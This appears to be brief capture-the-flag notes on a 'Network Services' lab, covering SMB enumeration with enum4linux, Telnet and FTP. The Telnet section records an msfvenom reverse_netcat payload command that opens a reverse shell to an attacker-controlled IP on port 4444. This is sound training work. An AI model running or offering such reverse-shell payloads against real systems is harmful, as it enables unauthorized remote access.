# NETWORK SERVICES
```
IP = 10.10.48.30
```

### SMB
+ Server Message Block protocol is a response-request communication protocol.
+ Enumerated using `enum4linux -A $IP`

### Telnet
+ Telnet is an application protocol without encryption so it has been replaced by SSH.
+ Found a port open on 8012.
+ Connected using telnet to the port.
+ Got reverse shell using payload by the cmd:
	`msfvenom -p cmd/unix/reverse_netcat lhost=10.13.0.166 lport=4444 R`

### FTP
+ FTP runs in two modes - Active and Passive
